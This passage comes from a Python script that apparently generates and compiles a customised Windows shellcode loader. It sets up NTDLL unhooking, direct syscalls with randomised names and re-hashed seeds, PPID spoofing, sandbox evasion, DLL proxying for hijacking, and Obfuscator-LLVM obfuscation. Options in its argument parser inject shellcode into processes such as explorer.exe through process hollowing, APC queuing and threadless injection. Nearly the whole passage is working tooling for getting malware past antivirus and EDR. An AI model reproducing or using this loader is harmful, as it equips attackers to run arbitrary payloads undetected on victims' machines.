        stub = stub.replace("REPLACE_UNHOOKING_DEFINTIONS", unhook_definitions)
        stub = stub.replace("REPLACE_ME_NTDLL_UNHOOK", unhook_ntdll)
        stub = stub.replace("REPLACE_ME_CALL_UNHOOK", unhook_call)
        if syscall_arg != "none":
            print(f"[+] Disabling {syscall_arg} as it is not needed when used with unhooking")
            syscall_arg = "none"
    else:
        stub = stub.replace("REPLACE_UNHOOKING_DEFINTIONS", "")
        stub = stub.replace("REPLACE_ME_NTDLL_UNHOOK", "")
        stub = stub.replace("REPLACE_ME_CALL_UNHOOK", "")

    syscallFileName = "SW2Syscalls.h"
    if syscall_arg == "getsyscallstub":
        print("[+] Using GetSyscallStub for syscalls")
        stub = stub.replace("REPLACE_ME_SYSCALL_INCLUDE", '#include <winternl.h>\n#pragma comment(lib, "ntdll")')
        stub = stub.replace("REPLACE_ME_SYSCALL_STUB_P1", GetSyscallStubP1)
        if sandbox == "sleep" or sandbox == "dll":
            stub = stub.replace("REPLACE_ME_SYSCALL_STUB_B4_SANDBOX", GetSyscallStubP2)
            stub = stub.replace("REPLACE_ME_SYSCALL_STUB_P2", "")
        else:
            stub = stub.replace("REPLACE_ME_SYSCALL_STUB_B4_SANDBOX", "")
            stub = stub.replace("REPLACE_ME_SYSCALL_STUB_P2", GetSyscallStubP2)
    elif syscall_arg == "none":
        print("[+] Direct syscalls have been disabled, getting API funcs from ntdll in memory!")
        stub = stub.replace("REPLACE_ME_SYSCALL_INCLUDE", '#include <winternl.h>\n#pragma comment(lib, "ntdll")')
        stub = stub.replace("REPLACE_ME_SYSCALL_STUB_P1", NoSyscall_StubP1)
        if sandbox == "sleep" or sandbox == "dll":
            stub = stub.replace("REPLACE_ME_SYSCALL_STUB_B4_SANDBOX", NoSyscall_StubP2)
            stub = stub.replace("REPLACE_ME_SYSCALL_STUB_P2", "")
        else:
            stub = stub.replace("REPLACE_ME_SYSCALL_STUB_B4_SANDBOX", "")
            stub = stub.replace("REPLACE_ME_SYSCALL_STUB_P2", NoSyscall_StubP2)
    else:
        if syscall_arg == "syswhispers2":
            print("[+] Using SysWhispers2 for syscalls")
            syscallFileName = "SW2Syscalls.h"
        elif syscall_arg == "syswhispers3":
            print("[+] Using SysWhispers3 for syscalls")
            syscallFileName = "SW3Syscalls.h"
        stub = stub.replace("REPLACE_ME_SYSCALL_INCLUDE", '#include <winternl.h>\n#include "Syscalls2.h"')
        stub = stub.replace("REPLACE_ME_SYSCALL_STUB_B4_SANDBOX", "")
        stub = stub.replace("REPLACE_ME_SYSCALL_STUB_P1", "")
        stub = stub.replace("REPLACE_ME_SYSCALL_STUB_P2", "")
        print("[+] Re-hashing API syscalls")
        new_seed = random.randint(2 ** 28, 2 ** 32 - 1)
        #new_seed = 0x1337C0DE
        old_seed = get_old_seed(syscall_arg)
        replace_seed(old_seed, new_seed, syscall_arg)
        replace_syscall_hashes(new_seed, syscall_arg)

    if no_ppid_spoof == True:
        print("[+] PPID Spoofing has been disabled")
        stub = stub.replace("REPLACE_PPID_SPOOF", "")
        stub = stub.replace("REPLACE_GET_PROC_TOKEN_FUNCTION", get_proc_session_ID)
        stub = stub.replace("REPLACE_PPID_PRIV_CHECK", ppid_unpriv_check)
    else:
        stub = stub.replace("REPLACE_PPID_SPOOF", "UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);")
        if ppid_priv == True:
            print(f"[+] Attemping to use privileged {ppid_process} for PPID Spoofing")
            stub = stub.replace("REPLACE_GET_PROC_TOKEN_FUNCTION", get_proc_elevation)
            stub = stub.replace("REPLACE_PPID_PRIV_CHECK", ppid_priv_check)
        else:
            stub = stub.replace("REPLACE_GET_PROC_TOKEN_FUNCTION", get_proc_session_ID)
            print(f"[+] Attemping to use non-privileged {ppid_process} for PPID Spoofing")
            stub = stub.replace("REPLACE_PPID_PRIV_CHECK", ppid_unpriv_check)
    stub = stub.replace("REPLACE_PPID_PROCESS", ppid_process)

    if no_sandbox == True:
        print("[+] Sandbox checks have been disabled")
        stub = stub.replace("REPLACE_SANDBOX_CHECK", "")
        stub = stub.replace("//REPLACE_ME_SANDBOX_CALL", "")
    elif sandbox == "dll":
        print("[+] Using DLL enumeration for sandbox evasion")
        stub = stub.replace("REPLACE_SANDBOX_CHECK", dll_sandbox_check)
        stub = stub.replace("//REPLACE_ME_SANDBOX_CALL", "getLoadedDlls();")
    elif sandbox == "hostname":
        print("[+] Using hostname enumeration for sandbox evasion")
        stub = stub.replace("REPLACE_SANDBOX_CHECK", hostname_sanbox_check)
        stub = stub.replace("REPLACE_ME_HOSTNAME", sandbox_arg)
        stub = stub.replace("//REPLACE_ME_SANDBOX_CALL", "hostcheck();")
    elif sandbox == "username":
        print("[+] Using username enumeration for sandbox evasion")
        stub = stub.replace("REPLACE_SANDBOX_CHECK", username_sanbox_check)
        stub = stub.replace("REPLACE_ME_USERNAME", sandbox_arg)
        stub = stub.replace("//REPLACE_ME_SANDBOX_CALL", "usercheck();")
    elif sandbox == "domain":
        print("[+] Using domain enumeration for sandbox evasion")
        stub = stub.replace("REPLACE_SANDBOX_CHECK", domain_sanbox_check)
        stub = stub.replace("REPLACE_ME_DOMAINNAME", sandbox_arg)
        stub = stub.replace("//REPLACE_ME_SANDBOX_CALL", "domaincheck();")
    else:
        print("[+] Using sleep technique for sandbox evasion")
        stub = stub.replace("REPLACE_SANDBOX_CHECK", "")
    stub = stub.replace("REPLACE_SLEEP_CHECK", sleep_check)
    stub = stub.replace("REPLACE_ME_SLEEP_CALL", "SleepCheck();")

    # Thanks tothi! https://github.com/tothi/dll-hijack-by-proxying
    if dll_proxy != None:
        dll = True
        print("[+] Using {} for DLL Proxying".format(dll_proxy))
        legit_dll = pefile.PE(dll_proxy)
        dll_basename = os.path.splitext(dll_proxy)[0]

        f = open("stub.def", "w")
        f.write("EXPORTS\n")
        for export in legit_dll.DIRECTORY_ENTRY_EXPORT.symbols:
            if export.name:
                f.write('{}={}.{} @{}\n'.format(export.name.decode(), dll_basename, export.name.decode(), export.ordinal))
        f.close()

    if dll == True:
        print("[+] Generating DLL instead of exe")
        stub = stub.replace("REPLACE_DLL_MAIN", rundll_stub)
        verbose = False
        if outfile == "a.exe":
            outfile = "a.dll"
    else:
        stub = stub.replace("REPLACE_DLL_MAIN", "")

    #Randomize Syscall names
    f = open(syscallFileName, "r")
    syscall_contents = f.read()
    f.close()
    if no_randomize != True:
        print("[+] Randomizing syscall names")
        name_len = 19
        syscalls = ["NtOpenSection", "NtMapViewOfSection", "NewNtWaitForSingleObject", "NewNtQueryInformationProcess", "NewNtClose", "NtQueryInformationProcess", "NtReadVirtualMemory", "NtProtectVirtualMemory", "NtWriteVirtualMemory", "NtResumeThread", "NtClose", "NtOpenProcess", "NtCreateThreadEx", "NtAllocateVirtualMemory", "NtWaitForSingleObject", "NtQueueApcThread", "NtAlertResumeThread", "NtGetContextThread", "NtSetContextThread", "NtDelayExecution"]
        for syscall in syscalls:
            random_syscall = generateRandomSyscall(name_len)
            syscall_contents = syscall_contents.replace(syscall, random_syscall)
            stub = stub.replace(syscall, random_syscall)
    #print(syscall_contents)
    f = open("Syscalls2.h", "w")
    f.write(syscall_contents)
    f.close()

    if verbose == True:
        print("[+] Verbose messages enabled")

    file = open("stub.cpp", "w")
    file.write(stub)
    file.close()
    print("[+] Saved new stub to stub.cpp")
    print("[+] Compiling new stub...")
    if verbose == True:
        if obfuscator_LLVM == True:
            print("[+] Using Obfuscator-LLVM to compile stub...")
            # Feel free to modify the OLLVM flags to fit your needs.
            os.system("x86_64-w64-mingw32-clang++ stub.cpp -s -w -fpermissive -std=c++2a -static -lpsapi -lntdll -Wl,--subsystem,console -Xclang -flto-visibility-public-std -mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -mllvm -bcf_loop=1 -mllvm -sub_loop=1 -mllvm -sobf -o {}".format(outfile))
        else:
            os.system("x86_64-w64-mingw32-g++ stub.cpp -s -w -std=c++17 -masm=intel -fpermissive -static -lntdll -lpsapi -Wl,--subsystem,console -o {}".format(outfile))
    else:
        if obfuscator_LLVM == True:
            print("[+] Using Obfuscator-LLVM to compile stub...")
            # Feel free to modify the OLLVM flags to fit your needs.
            if dll == True and dll_proxy != None:
                os.system("x86_64-w64-mingw32-clang++ stub.cpp stub.def -s -w -fpermissive -std=c++2a -static -lpsapi -lntdll -Wl,--subsystem,windows -shared -Xclang -flto-visibility-public-std -mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -mllvm -bcf_loop=1 -mllvm -sub_loop=1 -mllvm -sobf -o {}".format(outfile))
                os.system("rm stub.def")
            elif dll == True and dll_proxy == None:
                os.system("x86_64-w64-mingw32-clang++ stub.cpp -s -w -fpermissive -std=c++2a -static -lpsapi -lntdll -Wl,--subsystem,windows -shared -Xclang -flto-visibility-public-std -mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -mllvm -bcf_loop=1 -mllvm -sub_loop=1 -mllvm -sobf -o {}".format(outfile))
            else:
                os.system("x86_64-w64-mingw32-clang++ stub.cpp -s -w -fpermissive -std=c++2a -static -lpsapi -lntdll -Wl,--subsystem,windows -Xclang -flto-visibility-public-std -mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -mllvm -bcf_loop=1 -mllvm -sub_loop=1 -mllvm -sobf -o {}".format(outfile))
        else:
            if dll == True and dll_proxy != None:
                os.system("x86_64-w64-mingw32-g++ stub.cpp stub.def -s -w -std=c++17 -masm=intel -fpermissive -static -lpsapi -lntdll -Wl,--subsystem,windows -shared -o {}".format(outfile))
                os.system("rm stub.def")
            elif dll == True and dll_proxy == None:
                os.system("x86_64-w64-mingw32-g++ stub.cpp -s -w -std=c++17 -masm=intel -fpermissive -static -lpsapi -lntdll -Wl,--subsystem,windows -shared -o {}".format(outfile))
            else:
                os.system("x86_64-w64-mingw32-g++ stub.cpp -s -w -std=c++17 -masm=intel -fpermissive -static -lpsapi -lntdll -Wl,--subsystem,windows -o {}".format(outfile))
    if os.path.exists(outfile) == True:
        print("[!] {} has been compiled successfully!".format(outfile))
    else:
        print("[!] Stub compilation failed! Something went wrong!")
    os.system("rm stub.cpp")
    os.system("rm Syscalls2.h")


print(inspiration[1:-1])
parser = argparse.ArgumentParser(description='ICYGUIDER\'S CUSTOM SYSCALL SHELLCODE LOADER')
parser.add_argument("file", help="File containing raw shellcode", type=str)
parser.add_argument('-p', '--process', dest='process', help='Process to inject into (Default: explorer.exe)', metavar='explorer.exe', default='explorer.exe')
parser.add_argument('-m', '--method', dest='method', help='Method for shellcode execution (Options: ThreadlessInject, ModuleStomping, QueueUserAPC, ProcessHollow, EnumDisplayMonitors, RemoteThreadContext, RemoteThreadSuspended, CurrentThread) (Default: QueueUserAPC)', metavar='QueueUserAPC', default='QueueUserAPC')
parser.add_argument('-u', '--unhook', action='store_true', help='Unhook NTDLL in current process')
parser.add_argument('-w', '--word-encode', action='store_true', help='Save shellcode in stub as array of English words')
parser.add_argument('-nr', '--no-randomize', action='store_true', help='Disable syscall name randomization')
parser.add_argument('-ns', '--no-sandbox', action='store_true', help='Disable sandbox checks')
parser.add_argument('-l', '--llvm-obfuscator', action='store_true', help='Use Obfuscator-LLVM to compile stub')
parser.add_argument('-v', '--verbose', action='store_true', help='Enable debugging messages upon execution')
parser.add_argument('-sc', '--syscall', dest='syscall_arg', help='Syscall execution method (Options: SysWhispers2, SysWhispers3, GetSyscallStub, None) (Default: GetSyscallStub)', metavar='GetSyscallStub', default='GetSyscallStub')
parser.add_argument('-d', '--dll', action='store_true', help='Generate a DLL instead of EXE')
parser.add_argument('-dp', '--dll-proxy', dest='dll_proxy', metavar='apphelp.dll', help='Create Proxy DLL using supplied legitimate DLL (File must exist in current dir)')
parser.add_argument('-s', '--sandbox', dest='sandbox', help='Sandbox evasion technique (Options: sleep, domain, hostname, username, dll) (Default: sleep)', metavar='domain', default='sleep')
parser.add_argument('-sa', '--sandbox-arg', dest='sandbox_arg', help='Argument for sandbox evasion technique (Ex: WIN10CO-DESKTOP, testlab.local)', metavar='testlab.local')
parser.add_argument('-o', '--outfile', dest='out', help='Name of compiled file', metavar='a.exe', default='a.exe')
ppid_options = parser.add_argument_group('PPID Spoofing')
ppid_options.add_argument('-pp', '--ppid', dest='ppid', metavar='explorer.exe', help='Parent process to use for PPID Spoofing (Default: explorer.exe)', default='explorer.exe')
ppid_options.add_argument('-ppv', '--ppid-priv', action='store_true', help='Enable spoofing for privileged parent process (Disabled by default)')
ppid_options.add_argument('-np', '--no-ppid-spoof', action='store_true', help='Disable PPID spoofing')
thredless_options = parser.add_argument_group('ThreadlessInject')
thredless_options.add_argument('-cp', '--create-process', dest='create_process', action='store_true', help='Create process instead of injecting into existing one')
thredless_options.add_argument('-td', '--target-dll', dest='target_dll', help='Target DLL containing export function to overwrite', metavar='ntdll.dll', default='ntdll.dll')
thredless_options.add_argument('-ef', '--export-function', dest='export_function', help='Export function to overwrite', metavar='NtClose', default='NtClose')

if len(sys.argv) < 2:
    parser.print_help()
    sys.exit()
args = parser.parse_args()
try:
    if os.path.exists(args.out) == True:
        os.system("rm {}".format(args.out))
    sandbox = args.sandbox.lower()
    if args.no_sandbox == False:
        if sandbox != "dll" and sandbox != "hostname" and sandbox != "domain" and sandbox != "username" and sandbox != "sleep":
            print("[!] Invalid sandbox evasion technique provided!")
            print("[+] Valid sandbox evasion techniques are: domain, hostname, username, dll, sleep")
            sys.exit()
        if sandbox == "hostname" and args.sandbox_arg == None:
            print("[!] No hostname specified for hostname based sandbox evasion. Please supply it using the '-sa' flag.")
            sys.exit()
        if sandbox == "username" and args.sandbox_arg == None:
            print("[!] No username specified for username based sandbox evasion. Please supply it using the '-sa' flag.")
            sys.exit()
        if sandbox == "domain" and args.sandbox_arg == None:
            print("[!] No domain specified for domain based sandbox evasion. Please supply it using the '-sa' flag.")
            sys.exit()
    method = args.method.lower()
    syscall_arg = args.syscall_arg.lower()
    if method != "threadlessinject" and method != "queueuserapc" and method != "modulestomping" and method != "functionstomping" and method != "processhollow" and method != "enumdisplaymonitors" and method != "remotethreadsuspended" and method != "remotethreadcontext" and method != "currentthread":
        print("[!] Invalid shellcode execution method provided!")
        print("[+] Valid shellcode execution methods are: ModuleStomping, QueueUserAPC, ProcessHollow, EnumDisplayMonitors, RemoteThreadContext, RemoteThreadSuspended, CurrentThread")
        sys.exit()
    if args.process == "msedge.exe":
        args.process = "C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe"
    elif args.process == "iexplore.exe":
        args.process = "C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe"
    key = generateKey(49)
    main(stub, args.file, args.out, key, args.process, method, args.no_randomize, args.verbose, sandbox, args.no_sandbox, args.llvm_obfuscator, args.word_encode, args.dll, args.sandbox_arg, args.no_ppid_spoof, args.dll_proxy, args.unhook, syscall_arg, args.create_process, args.target_dll, args.export_function, args.ppid, args.ppid_priv)
except:
    raise
    sys.exit()
